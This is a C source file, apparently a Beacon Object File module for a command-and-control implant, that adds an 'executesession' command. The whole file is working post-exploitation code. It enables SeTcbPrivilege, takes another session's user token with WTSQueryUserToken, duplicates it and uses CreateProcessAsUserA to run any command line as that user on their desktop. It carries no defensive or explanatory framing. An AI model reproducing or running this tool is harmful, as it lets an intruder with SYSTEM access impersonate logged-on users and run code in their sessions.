/*
 * executesession <session> <command line> - launch a process in another
 * interactive session using that session's user token.
 *
 * Requires SYSTEM with SeTcbPrivilege (enable it first if needed).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void enable_tcb(void)
{
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, "SeTcbPrivilege", &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

void go(char *args, int alen)
{
    datap parser;
    int session;
    char *cmd;
    int clen;
    char cmdline[1024];
    HANDLE user = NULL, primary = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    BeaconDataParse(&parser, args, alen);
    session = BeaconDataInt(&parser);
    cmd = BeaconDataExtract(&parser, &clen);
    if (session < 0 || !cmd || !cmd[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: executesession <session> <command line>\n");
        return;
    }

    bof_strncpy(cmdline, cmd, sizeof(cmdline));
    enable_tcb();

    if (!WTSAPI32$WTSQueryUserToken((ULONG)session, &user)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "WTSQueryUserToken(%d) failed: %lu (need SYSTEM + SeTcbPrivilege)\n",
                     session, (unsigned long)KERNEL32$GetLastError());
        return;
    }

    if (!ADVAPI32$DuplicateTokenEx(user, MAXIMUM_ALLOWED, NULL,
                                   SecurityImpersonation, TokenPrimary, &primary)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(user);
        return;
    }

    bof_memzero(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    bof_memzero(&pi, sizeof(pi));

    if (ADVAPI32$CreateProcessAsUserA(primary, NULL, cmdline, NULL, NULL, FALSE,
                                      CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Started PID %lu in session %d: %s\n",
                     (unsigned long)pi.dwProcessId, session, cmdline);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUser failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(primary);
    KERNEL32$CloseHandle(user);
}
